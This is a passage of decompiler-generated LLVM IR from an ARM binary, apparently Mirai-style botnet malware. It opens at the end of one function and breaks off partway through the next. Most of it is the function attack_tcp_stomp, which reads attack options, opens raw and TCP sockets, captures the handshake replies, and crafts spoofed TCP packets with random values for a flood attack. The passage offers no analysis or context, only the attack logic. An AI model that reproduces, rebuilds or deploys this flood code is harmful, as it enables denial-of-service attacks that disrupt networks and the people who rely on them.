  uselistorder label %bb77, { 1, 0 }
}

define i32 @attack_tcp_stomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp34 = call i16 @__decompiler_undefined_function_1()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_b500 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_b51c = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b528 = load i32, i32* @r6, align 4
  store i32 %v0_b528, i32* %r0.global-to-local, align 4
  %v2_b52c = call i32 @calloc(i32 %v0_b528, i32 4)
  %v0_b530 = load i32, i32* @r5, align 4
  store i32 %v0_b530, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b540 = load i32, i32* @r4, align 4
  store i32 %v0_b540, i32* %r0.global-to-local, align 4
  %v5_b544 = inttoptr i32 %v0_b530 to i32*
  %v6_b544 = call i32 @attack_get_opt_int(i32 %v0_b540, i32* %v5_b544, i32 2, i32 0)
  %v1_b550 = urem i32 %v6_b544, 256
  store i32 %v1_b550, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b55c = load i32, i32* @r5, align 4
  store i32 %v0_b55c, i32* %r1.global-to-local, align 4
  %v0_b560 = load i32, i32* @r4, align 4
  store i32 %v0_b560, i32* %r0.global-to-local, align 4
  %v5_b564 = trunc i32 %v6_b544 to i8
  %v6_b568 = inttoptr i32 %v0_b55c to i32*
  %v7_b568 = call i32 @attack_get_opt_int(i32 %v0_b560, i32* %v6_b568, i32 3, i32 65535)
  %v0_b56c = load i32, i32* @r5, align 4
  store i32 %v0_b56c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b568, i32* @r7, align 4
  %v0_b57c = load i32, i32* @r4, align 4
  store i32 %v0_b57c, i32* %r0.global-to-local, align 4
  %v4_b580 = inttoptr i32 %v0_b56c to i32*
  %v5_b580 = call i32 @attack_get_opt_int(i32 %v0_b57c, i32* %v4_b580, i32 4, i32 64)
  %v1_b588 = urem i32 %v5_b580, 256
  store i32 %v1_b588, i32* %ip.global-to-local, align 4
  %v0_b58c = load i32, i32* @r5, align 4
  store i32 %v0_b58c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b598 = load i32, i32* @r4, align 4
  store i32 %v0_b598, i32* %r0.global-to-local, align 4
  %v6_b5a0 = inttoptr i32 %v0_b58c to i32*
  %v7_b5a0 = call i32 @attack_get_opt_int(i32 %v0_b598, i32* %v6_b5a0, i32 5, i32 1)
  %v1_b5ac = urem i32 %v7_b5a0, 256
  store i32 %v1_b5ac, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b5b4 = load i32, i32* @r5, align 4
  store i32 %v0_b5b4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b5bc = load i32, i32* @r4, align 4
  store i32 %v0_b5bc, i32* %r0.global-to-local, align 4
  %v5_b5c4 = inttoptr i32 %v0_b5b4 to i32*
  %v6_b5c4 = call i32 @attack_get_opt_int(i32 %v0_b5bc, i32* %v5_b5c4, i32 7, i32 65535)
  %v0_b5c8 = load i32, i32* @r5, align 4
  store i32 %v0_b5c8, i32* %r1.global-to-local, align 4
  %v3_b5cc = mul i32 %v6_b5c4, 65536
  store i32 %v3_b5cc, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b5d8 = load i32, i32* @r4, align 4
  store i32 %v0_b5d8, i32* %r0.global-to-local, align 4
  %v3_b5dc = urem i32 %v6_b5c4, 65536
  store i32 %v3_b5dc, i32* @sl, align 4
  %v4_b5e0 = inttoptr i32 %v0_b5c8 to i32*
  %v5_b5e0 = call i32 @attack_get_opt_int(i32 %v0_b5d8, i32* %v4_b5e0, i32 11, i32 0)
  %v1_b5e8 = urem i32 %v5_b5e0, 256
  store i32 %v1_b5e8, i32* %ip.global-to-local, align 4
  %v0_b5ec = load i32, i32* @r5, align 4
  store i32 %v0_b5ec, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b5f8 = load i32, i32* @r4, align 4
  store i32 %v0_b5f8, i32* %r0.global-to-local, align 4
  %v5_b600 = inttoptr i32 %v0_b5ec to i32*
  %v6_b600 = call i32 @attack_get_opt_int(i32 %v0_b5f8, i32* %v5_b600, i32 12, i32 1)
  %v1_b608 = urem i32 %v6_b600, 256
  store i32 %v1_b608, i32* %ip.global-to-local, align 4
  %v0_b60c = load i32, i32* @r5, align 4
  store i32 %v0_b60c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b618 = load i32, i32* @r4, align 4
  store i32 %v0_b618, i32* %r0.global-to-local, align 4
  %v5_b620 = inttoptr i32 %v0_b60c to i32*
  %v6_b620 = call i32 @attack_get_opt_int(i32 %v0_b618, i32* %v5_b620, i32 13, i32 1)
  %v1_b628 = urem i32 %v6_b620, 256
  store i32 %v1_b628, i32* %ip.global-to-local, align 4
  %v0_b62c = load i32, i32* @r5, align 4
  store i32 %v0_b62c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b638 = load i32, i32* @r4, align 4
  store i32 %v0_b638, i32* %r0.global-to-local, align 4
  %v5_b640 = inttoptr i32 %v0_b62c to i32*
  %v6_b640 = call i32 @attack_get_opt_int(i32 %v0_b638, i32* %v5_b640, i32 14, i32 0)
  %v1_b648 = urem i32 %v6_b640, 256
  store i32 %v1_b648, i32* %ip.global-to-local, align 4
  %v0_b64c = load i32, i32* @r5, align 4
  store i32 %v0_b64c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b658 = load i32, i32* @r4, align 4
  store i32 %v0_b658, i32* %r0.global-to-local, align 4
  %v5_b660 = inttoptr i32 %v0_b64c to i32*
  %v6_b660 = call i32 @attack_get_opt_int(i32 %v0_b658, i32* %v5_b660, i32 15, i32 0)
  %v1_b668 = urem i32 %v6_b660, 256
  store i32 %v1_b668, i32* %ip.global-to-local, align 4
  %v0_b66c = load i32, i32* @r5, align 4
  store i32 %v0_b66c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b678 = load i32, i32* @r4, align 4
  store i32 %v0_b678, i32* %r0.global-to-local, align 4
  %v5_b680 = inttoptr i32 %v0_b66c to i32*
  %v6_b680 = call i32 @attack_get_opt_int(i32 %v0_b678, i32* %v5_b680, i32 16, i32 0)
  %v1_b688 = urem i32 %v6_b680, 256
  store i32 %v1_b688, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b694 = load i32, i32* @r5, align 4
  store i32 %v0_b694, i32* %r1.global-to-local, align 4
  %v0_b698 = load i32, i32* @r4, align 4
  store i32 %v0_b698, i32* %r0.global-to-local, align 4
  %v5_b6a0 = inttoptr i32 %v0_b694 to i32*
  %v6_b6a0 = call i32 @attack_get_opt_int(i32 %v0_b698, i32* %v5_b6a0, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b6b0 = load i32, i32* @r5, align 4
  store i32 %v0_b6b0, i32* %r1.global-to-local, align 4
  %v0_b6b4 = load i32, i32* @r4, align 4
  store i32 %v0_b6b4, i32* %r0.global-to-local, align 4
  %v4_b6b8 = inttoptr i32 %v0_b6b0 to i32*
  %v5_b6b8 = call i32 @attack_get_opt_int(i32 %v0_b6b4, i32* %v4_b6b8, i32 1, i32 1)
  %v1_b6c0 = urem i32 %v5_b6b8, 256
  store i32 %v1_b6c0, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b6d4 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b6d4, i32* %r0.global-to-local, align 4
  %v7_b6d8 = icmp eq i32 %v3_b6d4, -1
  store i1 %v7_b6d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b6d4, i32* @sb, align 4
  br i1 %v7_b6d8, label %dec_label_pc_b8c8, label %dec_label_pc_b6e4

dec_label_pc_b6e4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b6ec = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b6ec, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b700 = call i32 @__GI_setsockopt(i32 %v3_b6d4, i32 0, i32 3, i32 %v6_b6ec, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b700, i32* %r0.global-to-local, align 4
  %v7_b704 = icmp eq i32 %v5_b700, -1
  store i1 %v7_b704, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b704, label %dec_label_pc_b8c0, label %dec_label_pc_b70c

dec_label_pc_b70c:                                ; preds = %dec_label_pc_b6e4
  %v0_b70c = load i32, i32* @r7, align 4
  %v3_b70c = mul i32 %v0_b70c, 65536
  store i32 %v3_b70c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_b714 = load i32, i32* @r6, align 4
  %v2_b714 = icmp eq i32 %v0_b714, 0
  store i1 %v2_b714, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_b71c = urem i32 %v0_b70c, 65536
  store i32 %v3_b71c, i32* @fp, align 4
  br i1 %v2_b714, label %dec_label_pc_bb4c, label %dec_label_pc_b724.preheader

dec_label_pc_b724.preheader:                      ; preds = %dec_label_pc_b70c
  %v2_b770 = ptrtoint i32* %stack_var_-144 to i32
  %v2_b7b4 = ptrtoint i32* %stack_var_-64 to i32
  %v2_b7ec = ptrtoint i32* %stack_var_-80 to i32
  %v2_b7f8 = ptrtoint i32* %stack_var_-336 to i32
  %v2_b7fc = ptrtoint i32* %stack_var_-48 to i32
  %v4_b85c = zext i8 %tmp to i32
  %v1_b860 = and i32 %v4_b85c, 18
  %v2_b864 = icmp eq i32 %v1_b860, 18
  %v4_ba08 = sext i8 %v5_b564 to i32
  %sext = mul i32 %v5_b580, 16777216
  %v4_ba18 = sdiv i32 %sext, 16777216
  %v3_b848 = sext i16 %tmp61 to i32
  %v1_b86c = and i32 %v4_b85c, 5
  %v2_b86c = icmp eq i32 %v1_b86c, 0
  %v4_b7ac = add i32 %v2_b770, 82
  %v5_b7ac = inttoptr i32 %v4_b7ac to i16*
  %v1_b99c = add i32 %v6_b6a0, 40
  %v1_bab0 = urem i32 %v5_b5e0, 2
  %tmp97 = sub nsw i32 0, %v1_bab0
  %v4_bab8 = and i32 %tmp97, 32
  %v1_bac8 = urem i32 %v6_b600, 2
  %tmp98 = sub nsw i32 0, %v1_bac8
  %v4_bad0 = and i32 %tmp98, 16
  %v1_bae0 = urem i32 %v6_b620, 2
  %tmp99 = sub nsw i32 0, %v1_bae0
  %v4_bae8 = and i32 %tmp99, 8
  %v1_baf8 = urem i32 %v6_b640, 2
  %tmp100 = sub nsw i32 0, %v1_baf8
  %v4_bb00 = and i32 %tmp100, 4
  %v1_bb10 = urem i32 %v6_b660, 2
  %tmp101 = sub nsw i32 0, %v1_bb10
  %v3_bb18 = and i32 %tmp101, 2
  %v1_bb28 = urem i32 %v6_b680, 2
  br label %dec_label_pc_b724

dec_label_pc_b724:                                ; preds = %dec_label_pc_b724.preheader, %dec_label_pc_b898
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_b898 ], [ %tmp34, %dec_label_pc_b724.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_b898 ], [ %tmp37, %dec_label_pc_b724.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b730 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b730, i32* %r0.global-to-local, align 4
  %v7_b734 = icmp eq i32 %v3_b730, -1
  store i1 %v7_b734, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b730, i32* @r5, align 4
  br i1 %v7_b734, label %dec_label_pc_b898, label %dec_label_pc_b740

dec_label_pc_b740:                                ; preds = %dec_label_pc_b724, %dec_label_pc_b874
  %v0_b748 = phi i32 [ %v3_b888, %dec_label_pc_b874 ], [ %v3_b730, %dec_label_pc_b724 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_b874 ], [ %stack_var_-62.0, %dec_label_pc_b724 ]
  %stack_var_-60.1 = phi i32 [ %v0_b948, %dec_label_pc_b874 ], [ %stack_var_-60.0, %dec_label_pc_b724 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b748 = call i32 @__libc_fcntl(i32 %v0_b748, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b750 = or i32 %v2_b748, 2048
  store i32 %v1_b750, i32* @r2, align 4
  %v0_b754 = load i32, i32* @r5, align 4
  store i32 %v0_b754, i32* %r0.global-to-local, align 4
  %v2_b758 = call i32 @__libc_fcntl(i32 %v0_b754, i32 4)
  %v3_b75c = load i32, i32* %stack_var_-44, align 4
  %v5_b764 = mul i32 %v3_b75c, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_b770, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_b778 = add i32 %v5_b764, %arg2
  store i32 %v2_b778, i32* %r3.global-to-local, align 4
  %v1_b77c = add i32 %v2_b778, 20
  %v2_b77c = inttoptr i32 %v1_b77c to i8*
  %v3_b77c = load i8, i8* %v2_b77c, align 1
  %v4_b77c = zext i8 %v3_b77c to i32
  store i32 %v4_b77c, i32* %r2.global-to-local, align 4
  %v2_b780 = icmp ugt i8 %v3_b77c, 30
  %v7_b780 = icmp eq i8 %v3_b77c, 31
  store i1 %v7_b780, i1* %cpsr_z.global-to-local, align 1
  %v2_b784 = xor i1 %v7_b780, true
  %v3_b784 = and i1 %v2_b780, %v2_b784
  br i1 %v3_b784, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_b740
  %v5_b784 = add i32 %v2_b778, 16
  %v6_b784 = inttoptr i32 %v5_b784 to i32*
  %v7_b784 = load i32, i32* %v6_b784, align 4
  store i32 %v7_b784, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_b740, %bb
  %v4_b788 = phi i32 [ %v2_b778, %dec_label_pc_b740 ], [ %v7_b784, %bb ]
  %v4_b788.stack_var_-60.1 = select i1 %v3_b784, i32 %v4_b788, i32 %stack_var_-60.1
  %v2_b78c = xor i1 %v2_b780, true
  %v3_b78c = or i1 %v7_b780, %v2_b78c
  br i1 %v3_b78c, label %dec_label_pc_b8d4, label %dec_label_pc_b790

dec_label_pc_b790:                                ; preds = %bb71, %dec_label_pc_b8d4
  %v0_b948 = phi i32 [ %v5_b924, %dec_label_pc_b8d4 ], [ %v4_b788.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b798 = load i32, i32* @sl, align 4
  %v9_b798 = icmp eq i32 %v0_b798, 65535
  store i1 %v9_b798, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b798, label %dec_label_pc_b930, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_b790
  %v4_b79c = udiv i32 %v0_b798, 256
  %v2_b7a0 = urem i32 %v0_b798, 256
  store i32 %v2_b7a0, i32* %r2.global-to-local, align 4
  %v5_b7a4 = mul nuw nsw i32 %v2_b7a0, 256
  %v6_b7a4 = or i32 %v5_b7a4, %v4_b79c
  store i32 %v6_b7a4, i32* %r3.global-to-local, align 4
  store i32 %v2_b770, i32* %r0.global-to-local, align 4
  %v2_b7ac = trunc i32 %v6_b7a4 to i16
  store i16 %v2_b7ac, i16* %v5_b7ac, align 2
  br label %dec_label_pc_b7b4

dec_label_pc_b7b4:                                ; preds = %.thread9, %dec_label_pc_b930
  %stack_var_-62.2 = phi i16 [ %v1_b930, %dec_label_pc_b930 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_b7b4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b7bc = load i32, i32* @r5, align 4
  store i32 %v0_b7bc, i32* %r0.global-to-local, align 4
  %v3_b7c0 = call i32 @__libc_connect(i32 %v0_b7bc, i32 %v2_b7b4, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b7c8 = call i32 @__GI_time(i32* null)
  store i32 %v2_b7c8, i32* %r0.global-to-local, align 4
  store i32 %v2_b7c8, i32* @r4, align 4
  %v9_b828 = icmp eq i32 %tmp35, %v0_b948
  %v4_b850 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_b828 to i32
  %v9_b83c = icmp eq i1 %v9_b828, false
  %v9_b854 = icmp eq i32 %v3_b848, %v4_b850
  br label %dec_label_pc_b7e4

dec_label_pc_b7d4:                                ; preds = %.thread, %dec_label_pc_b844, %dec_label_pc_b86c, %bb75
  %v2_b7d4 = call i32 @__GI_time(i32* null)
  %v0_b7d8 = load i32, i32* @r4, align 4
  %v2_b7d8 = sub i32 %v2_b7d4, %v0_b7d8
  store i32 %v2_b7d8, i32* %r0.global-to-local, align 4
  %v7_b7dc = icmp eq i32 %v2_b7d8, 10
  store i1 %v7_b7dc, i1* %cpsr_z.global-to-local, align 1
  %v8_b7e0 = icmp sgt i32 %v2_b7d8, 10
  br i1 %v8_b7e0, label %dec_label_pc_b874, label %dec_label_pc_b7e4

dec_label_pc_b7e4:                                ; preds = %dec_label_pc_b7d4, %dec_label_pc_b7b4
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_b7f8, i32* %r1.global-to-local, align 4
  store i32 %v2_b7fc, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b804 = load i32, i32* @sb, align 4
  store i32 %v0_b804, i32* %r0.global-to-local, align 4
  %v6_b80c = call i32 @__libc_recvfrom(i32 %v0_b804, i32 %v2_b7f8, i32 256, i32 16384, i32 %v2_b7ec, i32 %v2_b7fc)
  store i32 %v6_b80c, i32* %r2.global-to-local, align 4
  %v7_b814 = icmp eq i32 %v6_b80c, -1
  store i1 %v7_b814, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b814, label %dec_label_pc_b8c8, label %dec_label_pc_b820

dec_label_pc_b820:                                ; preds = %dec_label_pc_b7e4
  store i32 %v0_b948, i32* %r1.global-to-local, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_b834 = icmp eq i32 %v6_b80c, 40
  store i1 %v7_b834, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_b80c, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_b820
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b7d4

bb75:                                             ; preds = %dec_label_pc_b820
  store i1 %v9_b83c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b83c, label %dec_label_pc_b7d4, label %dec_label_pc_b844

dec_label_pc_b844:                                ; preds = %bb75
  store i32 %v3_b848, i32* @lr, align 4
  store i32 %v2_b770, i32* @r3, align 4
  store i32 %v4_b850, i32* %r2.global-to-local, align 4
  store i1 %v9_b854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b854, label %dec_label_pc_b85c, label %dec_label_pc_b7d4

dec_label_pc_b85c:                                ; preds = %dec_label_pc_b844
  store i32 %v4_b85c, i32* %r2.global-to-local, align 4
  store i32 %v1_b860, i32* @r3, align 4
  store i1 %v2_b864, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b864, label %dec_label_pc_b940, label %dec_label_pc_b86c

dec_label_pc_b86c:                                ; preds = %dec_label_pc_b85c
  store i1 %v2_b86c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b86c, label %dec_label_pc_b7d4, label %dec_label_pc_b874

dec_label_pc_b874:                                ; preds = %dec_label_pc_b86c, %dec_label_pc_b7d4
  %v0_b874 = load i32, i32* @r5, align 4
  store i32 %v0_b874, i32* %r0.global-to-local, align 4
  %v1_b878 = call i32 @__GI___libc_close(i32 %v0_b874)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b888 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b888, i32* %r0.global-to-local, align 4
  %v3_b88c = icmp eq i32 %v3_b888, -1
  %v8_b88c = icmp eq i32 %v3_b888, -1
  store i1 %v8_b88c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b888, i32* @r5, align 4
  br i1 %v3_b88c, label %dec_label_pc_b898, label %dec_label_pc_b740

dec_label_pc_b898:                                ; preds = %dec_label_pc_b874, %dec_label_pc_b724, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_b724 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_b874 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b724 ], [ %v0_b948, %bb82 ], [ %v0_b948, %dec_label_pc_b874 ]
  %v3_b898 = load i32, i32* %stack_var_-44, align 4
  %v1_b89c = add i32 %v3_b898, 1
  store i32 %v1_b89c, i32* @r3, align 4
  %v1_b8a0 = load i32, i32* @r6, align 4
  %v9_b8a0 = icmp eq i32 %v1_b89c, %v1_b8a0
  store i1 %v9_b8a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b89c, i32* %stack_var_-44, align 4
  %v5_b8a8 = icmp slt i32 %v1_b89c, %v1_b8a0
  br i1 %v5_b8a8, label %dec_label_pc_b724, label %dec_label_pc_b8ac

dec_label_pc_b8ac:                                ; preds = %dec_label_pc_b898
  store i32 %v6_b6a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb5c

dec_label_pc_b8c0:                                ; preds = %dec_label_pc_b6e4
  %v0_b8c0 = load i32, i32* @sb, align 4
  store i32 %v0_b8c0, i32* %r0.global-to-local, align 4
  %v1_b8c4 = call i32 @__GI___libc_close(i32 %v0_b8c0)
  store i32 %v1_b8c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b8c8

dec_label_pc_b8c8:                                ; preds = %dec_label_pc_b7e4, %entry, %dec_label_pc_b8c0
  %v1_b8d0 = phi i32 [ %v3_b6d4, %entry ], [ %v1_b8c4, %dec_label_pc_b8c0 ], [ 0, %dec_label_pc_b7e4 ]
  store i32 %v27_b500, i32* %lr.global-to-local, align 4
  ret i32 %v1_b8d0

dec_label_pc_b8d4:                                ; preds = %bb71
  %v1_b8d4 = add i32 %v4_b788, 16
  %v2_b8d4 = inttoptr i32 %v1_b8d4 to i32*
  %v3_b8d4 = load i32, i32* %v2_b8d4, align 4
  store i32 %v3_b8d4, i32* @r4, align 4
  %v0_b8d8 = call i32 @rand_next()
  store i32 %v0_b8d8, i32* %r0.global-to-local, align 4
  %v3_b8dc = load i32, i32* %stack_var_-44, align 4
  %v5_b8e4 = mul i32 %v3_b8dc, 24
  %v0_b8ec = load i32, i32* @r4, align 4
  %v1_b8ec = and i32 %v0_b8ec, 16711680
  store i32 %v1_b8ec, i32* %ip.global-to-local, align 4
  %v3_b8f0 = udiv i32 %v0_b8ec, 16777216
  %v2_b8f4 = add i32 %v5_b8e4, %arg2
  store i32 %v2_b8f4, i32* %r1.global-to-local, align 4
  %v4_b8f8 = udiv i32 %v1_b8ec, 256
  %v5_b8f8 = or i32 %v4_b8f8, %v3_b8f0
  store i32 %v5_b8f8, i32* %r2.global-to-local, align 4
  %v1_b8fc = and i32 %v0_b8ec, 65280
  store i32 %v1_b8fc, i32* %r3.global-to-local, align 4
  %v1_b900 = add i32 %v2_b8f4, 20
  %v2_b900 = inttoptr i32 %v1_b900 to i8*
  %v3_b900 = load i8, i8* %v2_b900, align 1
  %v4_b900 = zext i8 %v3_b900 to i32
  store i32 %v4_b900, i32* %ip.global-to-local, align 4
  %v5_b908 = call i32 @llvm.bswap.i32(i32 %v0_b8ec)
  %v7_b90c = lshr i32 %v0_b8d8, %v4_b900
  %v8_b90c = add i32 %v7_b90c, %v5_b908
  store i32 %v8_b90c, i32* %r2.global-to-local, align 4
  %v1_b910 = and i32 %v8_b90c, 16711680
  store i32 %v1_b910, i32* %r0.global-to-local, align 4
  %v1_b91c = and i32 %v8_b90c, 65280
  store i32 %v1_b91c, i32* %r1.global-to-local, align 4
  %v5_b924 = call i32 @llvm.bswap.i32(i32 %v8_b90c)
  store i32 %v5_b924, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b790

dec_label_pc_b930:                                ; preds = %dec_label_pc_b790
  %v0_b930 = call i32 @rand_next()
  %v1_b930 = trunc i32 %v0_b930 to i16
  store i32 %v0_b930, i32* %r0.global-to-local, align 4
  store i32 %v2_b770, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b7b4

dec_label_pc_b940:                                ; preds = %dec_label_pc_b85c
  %v3_b940 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b940, i32* @r4, align 4
  store i32 %v2_b51c, i32* %ip.global-to-local, align 4
  %v5_b948 = mul i32 %v3_b940, 16
  %v6_b948 = add i32 %v5_b948, %v2_b51c
  %v7_b948 = inttoptr i32 %v6_b948 to i32*
  store i32 %v0_b948, i32* %v7_b948, align 4
  %v0_b94c = load i32, i32* @r8, align 4
  %v1_b94c = add i32 %v0_b94c, 4
  %v2_b94c = inttoptr i32 %v1_b94c to i32*
  %v3_b94c = load i32, i32* %v2_b94c, align 4
  store i32 %v3_b94c, i32* %r1.global-to-local, align 4
  %v1_b958 = and i32 %v3_b94c, 65280
  store i32 %v1_b958, i32* %r2.global-to-local, align 4
  store i32 %v2_b51c, i32* %r0.global-to-local, align 4
  %v0_b968 = load i32, i32* @r4, align 4
  %v3_b968 = mul i32 %v0_b968, 16
  %v2_b96c = add i32 %v3_b968, %v2_b51c
  store i32 %v2_b96c, i32* %ip.global-to-local, align 4
  %v5_b970 = call i32 @llvm.bswap.i32(i32 %v3_b94c)
  store i32 %v5_b970, i32* %r3.global-to-local, align 4
  %v2_b974 = add i32 %v2_b96c, 4
  %v3_b974 = inttoptr i32 %v2_b974 to i32*
  store i32 %v5_b970, i32* %v3_b974, align 4
  %v0_b978 = load i32, i32* @r8, align 4
  %v1_b978 = add i32 %v0_b978, 8
  %v2_b978 = inttoptr i32 %v1_b978 to i32*
  %v3_b978 = load i32, i32* %v2_b978, align 4
  store i32 %v3_b978, i32* %r1.global-to-local, align 4
  %v1_b97c = and i32 %v3_b978, 16711680
  store i32 %v1_b97c, i32* %r0.global-to-local, align 4
  store i32 %v6_b6a0, i32* %r2.global-to-local, align 4
  %v5_b994 = call i32 @llvm.bswap.i32(i32 %v3_b978)
  store i32 %v5_b994, i32* %r3.global-to-local, align 4
  %v1_b998 = add i32 %v0_b978, 2
  %v2_b998 = inttoptr i32 %v1_b998 to i16*
  %v3_b998 = load i16, i16* %v2_b998, align 2
  %v4_b998 = zext i16 %v3_b998 to i32
  store i32 %v4_b998, i32* %r1.global-to-local, align 4
  store i32 %v1_b99c, i32* @r7, align 4
  %v0_b9a0 = load i32, i32* @lr, align 4
  %v1_b9a0 = trunc i32 %v0_b9a0 to i16
  %v2_b9a0 = load i32, i32* %ip.global-to-local, align 4
  %v3_b9a0 = add i32 %v2_b9a0, 14
  %v4_b9a0 = inttoptr i32 %v3_b9a0 to i16*
